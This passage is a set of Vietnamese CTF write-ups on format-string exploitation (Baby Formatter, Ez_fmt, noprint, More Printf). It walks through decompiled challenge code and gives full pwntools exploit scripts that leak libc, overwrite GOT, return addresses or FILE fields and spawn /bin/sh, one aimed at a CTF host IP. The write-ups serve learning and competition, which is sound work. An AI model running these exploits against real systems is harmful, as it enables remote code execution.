elf = context.binary = ELF("./chall_patched",checksec=False)
p = elf.process()
#p = remote("localhost",10002)
libc = elf.libc

context.arch = elf.arch

# gdb.attach(p,'''
#     init-gef
#     b *strdup+52
#     c
# ''')

def vuln(payload):
    p.sendlineafter(b">> ",b"2")
    p.sendlineafter(b">> ",payload)

def write_payload_8(value,addr):
    for i in range(8):
        if(value == 0):
            break
        b = value % 0x100
        value = value // 0x100
        payload = f"%{b}c%8$hhn".ljust(16,'.')
        payload = payload.encode() + p64(addr + i)
        vuln(payload)

def another_one(payload):
    p.sendlineafter(b">> ",b"3")
    p.sendlineafter(b">> ",payload)


p.sendlineafter(b">> ",b"1")
p.recvuntil(b"this: ")
x = p.recvline()[:-1]
libc.address = int(x,16) - libc.sym.fgets
log.critical(f"libc: {hex(libc.address)}")

addr = 0x1fe170 + libc.address
log.info(f'addr: {hex(addr)}')
pop_rdi = 0x0000000000028715 + libc.address
pop_chain = 0x0000000000028710 + libc.address # pop r13 ; pop r14 ; pop r15 ; ret
ret = 0x0000000000026a3e + libc.address

log.info(f'ropchain: {hex(pop_chain)}')
# print(hex(pop_chain))
# print(hex(pop_chain&0xffffff))
# print(hex(addr))

payload = f"%{0x1000}c%8$hn".ljust(16,'.')
payload = payload.encode() + p64(addr - 1)
vuln(payload)

payload = f"%{(pop_chain//0x100)&0xffff}c%8$hn".ljust(16,'.')
payload = payload.encode() + p64(addr +1)
input()
vuln(payload)
another_one(p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system))

p.interactive()
```


- ngoài ra còn 1 cách khác nữa , đây là plt của ```strlen``` nó sẽ nhảy đến đoạn đó để thực thi địa chỉ ```got``` , tuy nhiên ở đây mình đã input '/bin/sh' và bằng 1 cách nào đó nó nằm ở ```rdi``` luôn , nên nếu ta overwrite địa chỉ này thành system và ta sẽ có 1 shell ...

![here](/assets/images/got_libc_hehe.png)

exp : 

```python
from pwn import *
BINARY_NAME = './chall_patched'
exe = context.binary = ELF(BINARY_NAME)
libc = exe.libc

def leak():
    s.sendlineafter(b'> ', b'1')
    return int(s.recvline().strip().split(b' ')[-1], 16) - libc.sym.fgets

def fmt(p):
    s.sendlineafter(b'> ', b'2')
    s.sendlineafter(b'> ', p)

def write(addr, val):
    for i in range(2):
        if val & 0xffff != 0:
            fmt(flat({
                0: f'%{val&0xffff}c%8$hn'.encode(),
                0x10: addr,
            }, filler=b'\x00'))
        val >>= 16
        addr += 2

def exploit(s):
    libc.address = leak()
    log.info(f'libc @ 0x{libc.address:x}')

    write(libc.address + 0x1FE080, libc.sym.system)
    s.sendlineafter(b'> ', b'3')
    s.sendlineafter(b'> ', b'/bin/sh')
    s.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process(BINARY_NAME)
    else:
        s = remote('34.70.212.151', 8008)
    exploit(s)
```

ref : 

[here](https://github.com/peace-ranger/CTF-WriteUps/tree/main/2023/backdoorCTF/(pwn)%20Baby%20Formatter)

[here](https://github.com/5kuuk/CTF-writeups/blob/main/backdoorctf-2023/pwn-+emptydb/exploit.c)

[1 bài sử dụng định dạng khác](https://sashactf.gitbook.io/pwn-notes/ctf-writeups/cor-ctf-2024/format-string#floating-point)


## Ez_fmt


checksec: no canary nhưng không có ```bof``` ở bài này

```cs
ploi@PhuocLoiiiii:~/pwn/FSB/WhiteHat-Play-11/pwn06-Ez_fmt$ checksec ez_fmt_patched
[*] '/home/ploi/pwn/FSB/WhiteHat-Play-11/pwn06-Ez_fmt/ez_fmt_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

### overviewoverview

- 1 bài khá ngắn , ta được input 80 byte và check nó ở ```restricted_filter```

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+58h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init();
  puts("Welcome to My Echo Service :##");
  while ( 1 )
  {
    fgets(buf, 80, stdin);
    if ( restricted_filter(buf) == -1 )
      break;
    printf(buf);
  }
  exit(1);
}
```

- restricted_filter:  hàm này nãy sẽ check kí tự đầu và thứ hai có trong các bytes bị filter không?

```cs
int __cdecl restricted_filter(const char *str)
{
  int result; // eax
  int i; // [rsp+1Ch] [rbp-14h]

  i = 0;
  while ( 2 )
  {
    if ( i >= strlen(str) )
      return 1;
    switch ( str[i] )
    {
      case 'A':
      case 'E':
      case 'F':
      case 'G':
      case 'X':
      case 'a':
      case 'd':
      case 'e':
      case 'f':
      case 'g':
      case 'i':
      case 'o':
      case 'p':
      case 's':
      case 'u':
      case 'x':
        puts("Invalid character :TT");
        result = -1;
        break;
      default:
        ++i;
        continue;
    }
    break;
  }
  return result;
}
```
- nhìn qua thì chỉ có 1 bug ```fsb``` , tuy nhiên ta lại bị filter các byte để leak như %p , %o , %x , %s
- GOT của file bài này full vì vậy không thể overwrite GOT , tuy nhiên got của libc chỉ là 1 phần -> có thể overwrite thằng này nhưng có lẽ build rop_chain overwrite ```saved_rip``` dễ dàng hơn , trước hết là cần tạo 1 loop vì không có libc , ta cần leak xong rồi mới exploit được


- ý tưởng đầu tiên để leak libc là sử dụng %$s , tuy nhiên đây là hình ảnh trên stack thì ta không thấy bất cứ con trỏ nào chứa địa chỉ libc 

![here](/assets/images/whitehat-11/1.png)

- tuy nhiên ta có thể control khá nhiều bytes trên stack , điều này có ích như thế nào?  ta sẽ tìm kiếm 1 địa chỉ nào đó có địa chỉ gần giống với địa chỉ chứa ```libc_start_main``` , và ghi 1 bytes vào đó , nếu may mắn ta có thể hoàn toàn leak được libc 
- ta sẽ thay đổi LSB ở đây thành 0x_8


- vậy làm sao có thể leak libc? ta thấy ở đây ta sẽ được input 80 bytes , và ở trên stack ta cũng thấy được có 2 địa chỉ stack ở đó 

![here](/assets/images/whitehat-11/2.png)

- vậy ta sẽ làm gì với điều này?

....





## noprint

- bài rất ngắn , nói đơn giản là trước hết nó sẽ malloc và trả về 1 địa chỉ heap , sau đó ta sẽ nhập dữ liệu vào vùng heap này , cuối cùng là dùng `fprintf` để ghi dữ liệu vào /dev/null 

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+20h] [rbp-10h]
  char *buf; // [rsp+28h] [rbp-8h]

  puts("Hello from the void");
  init(argv, envp);
  setbuf(_bss_start, 0);
  setbuf(stdin, 0);
  stream = fopen("/dev/null", "a");
  for ( buf = (char *)malloc(0x100u); ; fprintf(stream, buf) )
    buf[read(0, buf, 0x100u) - 1] = 0;
}
```

- khó khăn thứ nhất của bài này là ta không thể đặt dữ liệu lên stack dễ dàng được , thứ hai là ta không thể leak bất cứ thứ gì vì nó đang ghi vào /dev/null  , vậy ta chỉ có thể write? ta phải làm như thế nào? 


- có 2 cách để làm bài này : 

    - cách 1 : ghi đè return address của `vfprintf_internal` -> dùng định dạng *
    - cách 2 : thay đổi flags và fileno thành stdout -> có thể leak



- ta sẽ bắt đầu với cách 1 trước: 

offset của `rsp` ở bài này là 5 , và địa chỉ `0x55555555b6b0` sẽ chính là target của ta , ta sẽ cần thay đổi nó thành flags của stdout `0x00000000fbad2887` và `0x55555555b6b0+0x70` chính là fileno thành 1 

![image](https://hackmd.io/_uploads/rJM_7cmJxx.png)

- vì vậy ta sẽ cần kiếm các con trỏ trỏ đến nhau , và ở sau địa chỉ `libc_start_call_main` sẽ thích hợp để thực hiện việc này , ý tưởng của ta sẽ là sử dụng định dạng "*" để format string attack thay đổi giá trị tại offset đó thành `0x55555555b6b0+0x70` -> sau đó ta chỉ việc in ra 1 byte và ghi vào địa chỉ stack bên dưới , nó sẽ trông như sau: 

```c
s(b"%112c%*9$c%13$n".ljust(0x100, b"\0"))
s(b".%21$lln".ljust(0x100, b"\0"))
```

- lúc này ta thấy ta đã ghi thành công địa chỉ fileno , tiếp theo ta chỉ việc thay đổi flags -> `stdout` là được 

![image](https://hackmd.io/_uploads/BJ67H9m1el.png)


- lúc này ta đã hoàn tất việc thay đổi filestream thành stdout

![image](https://hackmd.io/_uploads/SySPHcQklg.png)


- cuối cùng chỉ cần thực hiện tương tự để build rop_chain , ở đây ta sẽ ghi rop_chain vào rip+8 trong fprintf , cuối cùng là thêm 1 ret để nó ret vào rop_chain 

exp:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from subprocess import check_output
from time import sleep

from pwn import *

context.terminal = [
    "wt.exe",
    "-w",
    "0",
    "split-pane",
    "-d",
    ".",
    "wsl.exe",
    "-d",
    "kali-linux",
    "--",
    "bash",
    "-c",
]
context.update(arch="amd64", os="linux")
context.log_level = "debug"
exe = context.binary = ELF("./noprint_patched", checksec=False)
libc = exe.libc
log_levels = ["info", "error", "warn", "debug"]
info = lambda msg: log.info(msg)
error = lambda msg: log.error(msg)
warn = lambda msg: log.warn(msg)
debug = lambda msg: log.debug(msg)


def one_gadget(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]


info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: (
    proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: (
    proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
)
sn = lambda num, proc=None: (
    proc.send(str(num).encode()) if proc else p.send(str(num).encode())
)
sna = lambda msg, num, proc=None: (
    proc.sendafter(msg, str(num).encode())
    if proc
    else p.sendafter(msg, str(num).encode())
)
sln = lambda num, proc=None: (
    proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
)
slna = lambda msg, num, proc=None: (
    proc.sendlineafter(msg, str(num).encode())
    if proc
    else p.sendlineafter(msg, str(num).encode())
)


def logbase():
    log.info("libc base = %#x" % libc.address)


def rcu(d1, d2=0):
    p.recvuntil(d1, drop=True)
    # return data between d1 and d2
    if d2:
        return p.recvuntil(d2, drop=True)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(
            int(pid),
            gdbscript=gdbscript
            + f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe",
            exe=exe.path,
        )
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
brva 0x0000000000001381
brva 0x00000000000013A7
c
"""

p = start()

# ==================== EXPLOIT ====================


def exploit():
    p.recvline()
    input()
    s(b"%112c%*9$c%13$n".ljust(0x100, b"\0"))
    s(b".%21$lln".ljust(0x100, b"\0"))
    s(f"%{0x2887}c%9$hn".encode().ljust(0x100, b"\0"))

    p.send(b"%11$p %12$p %16$p %50c".ljust(0x100, b"\x00"))
    p.recvuntil(b"0x")
    stack = int(p.recvuntil(b" "), 16) - 0xD8
    libc.address = int(p.recvuntil(b" "), 16) - 0x2A3B8
    exe.address = int(p.recvuntil(b" "), 16) - 0x12E4
    info(f"stack= {hex(stack)} libc: {hex(libc.address)} exe: {hex(exe.address)}")
    pop_rdi = libc.address + 0x00000000000CEE4D
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym.system
    info(f"bin_sh: {hex(bin_sh)}")
    info(f"system: {hex(system)}")
    info(f"pop: {hex(pop_rdi)}")

    ret = exe.address + 0x12E3

    def write_v(target, val):
        p.send(f"%{target&0xffff}c%11$hhn".encode().ljust(0x100, b"\0"))
        p.send(f"%{val&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
        p.send(f"%{(target+2)&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
        p.send(f"%{(val>>16)&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
        p.send(f"%{(target+4)&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
        p.send(f"%{(val>>32)&0xffff}c%31$n".encode().ljust(0x100, b"\0"))

    sleep(0.5)
    p.send(f"%{stack&0xffff}c%11$hn".encode().ljust(0x100, b"\0"))
    sleep(0.5)
    write_v(stack + 8, pop_rdi)
    sleep(0.5)
    write_v(stack + 16, bin_sh)
    sleep(0.5)
    write_v(stack + 24, system)
    sleep(0.5)
    p.send(f"%{stack&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
    sleep(0.5)
    p.send(f"%{ret&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))

    p.interactive()


if __name__ == "__main__":
    exploit()

```

cách 2 ta có thể xem ở đây: https://robbert1978.github.io/2025/03/02/2025-3-3-PwnMe-Quals-2025/




More Printf
-----

tóm tắt bài này là fmt tuy nhiên chỉ có 1 lần và không thể ghi đè main rồi leak các kiểu , nên chỉ được fmt 1 lần và lấy shell luôn , sử dụng * để ghi thằng này qua thàng khác , cần bruteforce và chưa làm ra :)))

còn thắc mắc nữa là tại sao offset nó là 5 ? 

https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/

https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/





- chương trình có vẻ rất đơn giản , đầu tiên ta thấy nó sẽ mở `/dev/null` và có 1 `fsb` 
```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3[2]; // [rsp+0h] [rbp-10h] BYREF

  v3[1] = __readfsqword(0x28u);
  v3[0] = (__int64)v3;
  setbuf(stdin, 0LL);
  buffer = (char *)malloc(0x21uLL);
  fp = fopen("/dev/null", "wb");
  fgets(buffer, 31, stdin);
  if ( i != 0x8D9E7E558877LL )
    _exit(1337);
  i = 1337LL;
  fprintf(fp, buffer);
  _exit(1);
}
```
- ở đây nó check biến i , có nghĩa là ta không thể quay lại main , ta cần 1 lần one_shot để giải quyết vấn đề 

- ta sẽ có 30 byte để giải quyết vấn đề này 

- khi đi sâu vào `fprintf` , ta sẽ thấy nó gọi `vprintf`

![image](https://hackmd.io/_uploads/HkTsug6TJe.png)

- ta sẽ thử leak 1 số thứ để tìm offset , dùng `set $rdi = _IO_stdout` để có thể leak và offset sẽ bắt đầu từ đây

![image](https://hackmd.io/_uploads/Hyf2Fepakl.png)


- vậy ý tưởng sẽ là gì?  ta sẽ dùng định dạng `*`  , ta sẽ dùng cái này để lấy offset trên stack của 1 địa chỉ libc và ghi nó vào `ret-address` -> thành 1 one_gadget thõa mãn và cách này sẽ không cần leak libc  , nếu ta dùng %*$8c thì nó tương tự như in tất cả byte của libc_start_main ra

- ta thấy trên stack có 1 địa chỉ stack trỏ đến chính nó , ta sẽ dùng `fsb` để ghi thằng này thành `0x7ffe440f0b28` là địa chỉ đang chứa stack , và sử dụng 1 số `magic` tính toán để ghi vào và thay đổi `0x7f17eaaf9151 (read+17)` thành `one_gadget`  

![image](https://hackmd.io/_uploads/BkdYTlTTyg.png)

`%c%c%c%5c%hhn%*8$d` cái này sẽ in ra 8 byte và ghi vào offset thứ 5 , sau đó in số lượng của `libc_start_main`

- ta sẽ chọn `og` thứ hai `0x4f3d5` 

![image](https://hackmd.io/_uploads/SJb-yZaTyx.png)

- lúc này địa chỉ base của libc là `0x7f7935d5a000` , và địa chỉ libc_start_main là `0x7f7935d7bbf7` , địa chỉ cần ghi sẽ là `0x7f7935d5a000` + `0x4f3d5` = `0x7f7935da93d5`  , vậy số byte cần ghi là 

![image](https://hackmd.io/_uploads/Hkzgl-66yl.png)

- trừ 8 vì trước đó đã in ra 8 byte

- ta có thể thấy được bây giờ nó đã ghi thành công , nhưng nó chưa ghi đúng vào vị trí ta cần , vì vậy sẽ cần 1 tí brute-force

![image](https://hackmd.io/_uploads/ryD4bb661l.png)

- như ta thấy bây giờ nó đã ghi thành công , tại `0x7fffe0a37908` chứa địa chỉ `og` của ta 

![image](https://hackmd.io/_uploads/ryICM-pTJx.png)


script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./more-printf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

#gdb.attach(p,gdbscript='''
#           b*main+193
#            b*fprintf+143
#            c
#           ''')

num_of_tries = 0
while True:
    try:
        sleep(0.5)
        p = process()
        num_of_tries += 1

        p.sendline('%c%c%c%5c%hhn%*8$d%186326c%5$n')
        p.sendline('id')
        p.unrecv(p.recvn(1, timeout=3))

        print(f"Got shell after {num_of_tries} tries")
        break
    except EOFError:
        pass
p.interactive()
```